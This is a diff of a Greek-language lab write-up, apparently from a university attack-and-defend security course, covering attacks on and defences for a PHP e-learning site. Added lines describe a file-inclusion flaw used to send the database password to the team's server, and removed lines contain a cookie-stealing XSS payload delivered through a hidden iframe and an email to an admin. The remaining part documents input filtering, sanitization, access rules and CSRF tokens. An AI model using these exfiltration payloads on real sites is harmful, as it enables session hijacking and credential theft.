@@ -364,7 +364,9 @@
        
        > http://hackerz.csec.chatzi.org/modules/admin/sysinfo/index.php?lng=../../../../../<path to php\>
        
-       Με αυτό το URL, μπορούμε να ανακατευθύνουμε την εκτέλεση σε κάθε πιθανό php που υπάρχει στον server!
+       Με αυτό το URL, μπορούμε να ανακατευθύνουμε την εκτέλεση σε κάθε πιθανό php που υπάρχει στον server και να καταφέρουμε \
+       εν τέλει να υποκλέψουμε τον κωδικό της βάσης και να τον στείλουμε στο server μας: \
+       > http://cybergh0sts.csec.chatzi.org/index.php?pass=$mysqlPassword
        
        
        Αξίζει να σημειωθεί ότι ακόμα και αν δεν υπήρχε η δυνατότητα να κάνουμε κάπου SQL injection για να πάρουμε τα κρυφά \
@@ -384,36 +386,16 @@
        
 ---
 ## Defense Tactics
-       
-Απόκτηση δικαιωμάτων διαχειριστή
 
-cookie stealer -> Αρχικά εντοπίσαμε ένα κενό στο modules/agenda/myagenda.php στο οποίο
-μπορούσαμε να κάνουμε xss προσθέτοντας το ?month=6&year=2020<script>xss</script> στο URL
-έπειτα φτιάξαμε ένα script που κλέβει το cookie και κάνει ένα request στον server του 
-online vm μας καλώντας το παρακάτω
-http://hackerz.csec.chatzi.org/modules/agenda/myagenda.php
-?month=6&year=2020<script>window.location.href = "http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallen=".concat(document.cookie);</script>
-Έπειτα τον ενσωματώσαμε σε ένα iframe που ήταν hidden , φτιάξαμε μια σελίδα στο puppies και βάλαμε το iframe μέσα . 
-Τέλος στείλαμε email στον drunk admin , ο οποίος ανοίγοντάς το ουσιαστικά μας έδωσε το cookie του . 
+- Άμυνες από την πλευρά του server :
+  Αρχικά βάλαμε σε πολλους φακέλους(όπως πχ στο /modules/admin/mysql),που απαγορευεται κανονικά η πρόσβαση απο απλούς χρήστες, 
+  ένα .htaccess έτσι ώστε να τους προστατεύσουμε . Σε κάποια από αυτά βάλαμε "Deny from all" και στου /modules/admin/mysql
+  βάλαμε έναν κωδικό με κάποιον χρήστη που φτιάξαμε .
 
-rfi -> Αρχικά εντοπίσαμε ένα κενό στο /modules/admin/sysinfo/index.php στο οποίο μπορούμε 
-να κάνουμε rfi κάποιου αρχείου αν προσθέσουμε ?lng=(path κάποιου αρχείου) στο τέλος του URL .
-Έτσι φτιάξαμε ένα php το οποίο κάνει require το config.php κανει έπειτα παίρνει την μεταβλητή
-$mysqlPassword και κάνει request στον server του online vm μας δηλαδή http://cybergh0sts.csec.chatzi.org/index.php?pass=$mysqlPassword
-Έτσι αποκτήσαμε τον κωδικό του διαχειριστή και με αυτόν , πρόσβαση στον διαχειριστή .
-
-
-Άμυνες :
-
-Άμυνες από την πλευρά του server :
-Αρχικά βάλαμε σε πολλους φακέλους(όπως πχ στο /modules/admin/mysql),που απαγορευεται κανονικά η πρόσβαση απο απλούς χρήστες, 
-ένα .htaccess έτσι ώστε να τους προστατεύσουμε . Σε κάποια από αυτά βάλαμε "Deny from all" και στου /modules/admin/mysql
-βάλαμε έναν κωδικό με κάποιον χρήστη που φτιάξαμε .
-
-Άμυνες σε XSS :  
-α) Σε αρκετά σημεία όπως στο modules/agenda/myagenda.php?month=6&year=2020<script>xss</script>
-χρησιμοποιήσαμε cut filtering , δηλαδή αν πάρουμε κάτι διαφορετικό εκτός από αριθμό στο year του URL , επιστρέφουμε τον 
-χρήστη στο αρχικό modules/agenda/myagenda.php , με τον παρακάτω τρόπο
+- Άμυνες σε XSS
+  α) Σε αρκετά σημεία όπως στο modules/agenda/myagenda.php?month=6&year=2020<script>xss</script\> \
+     χρησιμοποιήσαμε cut filtering , δηλαδή αν πάρουμε κάτι διαφορετικό εκτός από αριθμό στο year του URL , επιστρέφουμε τον \
+     χρήστη στο αρχικό modules/agenda/myagenda.php , με τον παρακάτω τρόπο \
 ```
 if (preg_match("/[^0-9]/", $year) or preg_match("/[^0-9]/" , $month) ) {
   header('Location: ./myagenda.php');
@@ -425,13 +407,13 @@ else {
 }
 ```
 
-β) Σε κάποια άλλα σημεία όπως στην τηλεσυνεργασία δεν θέλαμε να διαγράψουμε τελείως το μήνυμα του χρήστη σε περίπτωση
-που έκανε xss παρά θέλαμε να διατηρηθεί το μήνυμα χωρίς να εκτελεστεί . Αυτό το πετύχαμε με το sanitization , δηλαδή\
-```$chatLine = filter_var($chatLine , FILTER_SANITIZE_FULL_SPECIAL_CHARS);```\
-πράγμα που έκανε sanitize τους ειδικούς χαρακτήρες , οπότε ακόμα και αν ο χρήστης έγραφε <script>alert(...)</script>
-θα εκτυπωνώταν στο τσατ το <script>alert(...)</script> , αλλά δεν θα εκτελείτο .
+  β) Σε κάποια άλλα σημεία όπως στην τηλεσυνεργασία δεν θέλαμε να διαγράψουμε τελείως το μήνυμα του χρήστη σε περίπτωση \
+     που έκανε xss παρά θέλαμε να διατηρηθεί το μήνυμα χωρίς να εκτελεστεί . Αυτό το πετύχαμε με το sanitization , δηλαδή \
+     ```$chatLine = filter_var($chatLine , FILTER_SANITIZE_FULL_SPECIAL_CHARS);```\
+    πράγμα που έκανε sanitize τους ειδικούς χαρακτήρες , οπότε ακόμα και αν ο χρήστης έγραφε <script>alert(...)</script> \
+    θα εκτυπωνώταν στο τσατ το <script>alert(...)</script> , αλλά δεν θα εκτελείτο .
 
-γ) Άλλες φορές χρησιμοποιήσαμε το απλό filtering δηλαδή
+  γ) Άλλες φορές χρησιμοποιήσαμε το απλό filtering δηλαδή \
 ```
 $email = filter_var($email , FILTER_SANITIZE_EMAIL);
 $uname = preg_replace("/[^A-Za-z0-9]/", '', $uname);
@@ -439,10 +421,10 @@ $nom_form = preg_replace("/[^A-Za-z0-9]/", '', $nom_form);
 $prenom_form = preg_replace("/[^A-Za-z0-9]/", '', $prenom_form);
 $am = preg_replace("/[^0-9]/", '', $am);
 ```
-δ) Τέλος αν για κάποιο λόγο κάποιος έγραφε στο URL πχ http://cybergh0sts.chatzi.org/index.php/""> μπορούσε
-να κάνει GET request στο site και να τυπώσει κάτι , οπότε μπορούσε να κάνει και xss . Προκειμένου να το διορθώσουμε
-αυτό κόβαμε οποιουσδήποτε χαρακτήρες υπάρχουν μετά το .php με τον παρακάτω κώδικα , ο οποίος προστέθηκε πάνω πάνω 
-σε κάθε αρχείο 
+  δ) Τέλος αν για κάποιο λόγο κάποιος έγραφε στο URL πχ http://cybergh0sts.chatzi.org/index.php/""> μπορούσε \
+     να κάνει GET request στο site και να τυπώσει κάτι , οπότε μπορούσε να κάνει και xss . Προκειμένου να το διορθώσουμε \
+     αυτό κόβαμε οποιουσδήποτε χαρακτήρες υπάρχουν μετά το .php με τον παρακάτω κώδικα , ο οποίος προστέθηκε πάνω πάνω \
+     σε κάθε αρχείο \
 ```
 if (preg_match('/\.php\//' , $_SERVER['PHP_SELF'])){
 	header("Location: " . preg_replace('/\.php.*/' , '' , $_SERVER['PHP_SELF']) . ".php");
@@ -450,10 +432,10 @@ if (preg_match('/\.php\//' , $_SERVER['PHP_SELF'])){
 }
 ```
 
-Άμυνες σε SQLi :\
-α) Σε αρκετά σημεία όπως στο modules/auth/contactadmin.php?userid=1
-χρησιμοποιήσαμε cut filtering , δηλαδή αν πάρουμε κάτι διαφορετικό εκτός από αριθμό στο userid του URL , επιστρέφουμε τον 
-χρήστη στο αρχικό index.php , με τον παρακάτω τρόπο
+- Άμυνες σε SQLi
+  α) Σε αρκετά σημεία όπως στο modules/auth/contactadmin.php?userid=1
+     χρησιμοποιήσαμε cut filtering , δηλαδή αν πάρουμε κάτι διαφορετικό εκτός από αριθμό στο userid του URL , επιστρέφουμε τον 
+     χρήστη στο αρχικό index.php , με τον παρακάτω τρόπο
 ```
 if (preg_match("/[^0-9]/", $userid)){
 	header("Location: ../index.php");
@@ -461,7 +443,7 @@ if (preg_match("/[^0-9]/", $userid)){
 }
 ```
 
-β) Σε άλλα σημεία χρησιμοποιήσαμε το full filtering σε συνδυασμό με το preg_match δηλαδή :
+  β) Σε άλλα σημεία χρησιμοποιήσαμε το full filtering σε συνδυασμό με το preg_match δηλαδή: \
 ```
 if (preg_match("/[^0-9]/", $id)){
 	unset($id);
@@ -470,7 +452,7 @@ if (preg_match("/[^0-9]/", $id)){
 else {
 	$id = preg_replace("/[^0-9]/", '', $id);
 ```
-ή πχ στο upgrade/upgrade_functions.php
+   ή πχ στο upgrade/upgrade_functions.php \
 ```
 if (preg_match("/[^a-zA-Z]/", $username) ){
 	header("Location: " . $_SERVER['PHP_SELF']);
@@ -480,10 +462,10 @@ if (preg_match("/[^a-zA-Z]/", $username) ){
 $username = preg_replace("/[^a-zA-Z]/", '',  $username);
 ```
 
-Άμυνες σε CSRF :\
-α) Για την άμυνα ενάντια σε csrf πάνω σε φόρμες χρησιμοποιήσαμε tokens τα οποία τα βάζαμε ως hidden element της φόρμας δηλαδή\
+- Άμυνες σε CSRF
+  α) Για την άμυνα ενάντια σε csrf πάνω σε φόρμες χρησιμοποιήσαμε tokens τα οποία τα βάζαμε ως hidden element της φόρμας δηλαδή \
 ```<input type=\"hidden\" name=\"token\" value=".$_SESSION['tok'].">```
-Για την δημιουργία του token φτιάξαμε την παρακάτω συνάρτηση που ανάλογα με το n παράγει μια τυχαία συμβολοσειρά με μήκος n
+     Για την δημιουργία του token φτιάξαμε την παρακάτω συνάρτηση που ανάλογα με το n παράγει μια τυχαία συμβολοσειρά με μήκος n \
 ```
 function get_rand_pwd($n) {
     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
@@ -497,20 +479,16 @@ function get_rand_pwd($n) {
     return $randomString;
 } 
 ```
-To token αρχικοποιείται στο index όπως φαίνεται παρακάτω :
+   To token αρχικοποιείται στο index όπως φαίνεται παρακάτω :
 ```
 $n=25; 
 $fakepwd = get_rand_pwd($n);
 $_SESSION['tok'] = $fakepwd;
 ```
-Tέλος κάνοντας submit την φόρμα ελέγχουμε αν το token της φόρμας είναι ίδιο με το token του session όπως παρακάτω :
+   Tέλος κάνοντας submit την φόρμα ελέγχουμε αν το token της φόρμας είναι ίδιο με το token του session όπως παρακάτω :
 ```
 if ($_REQUEST['token'] != $_SESSION['tok']){
 	echo 'Request error!';
 	die;
 }
 ```
-       
-       
-       
-       
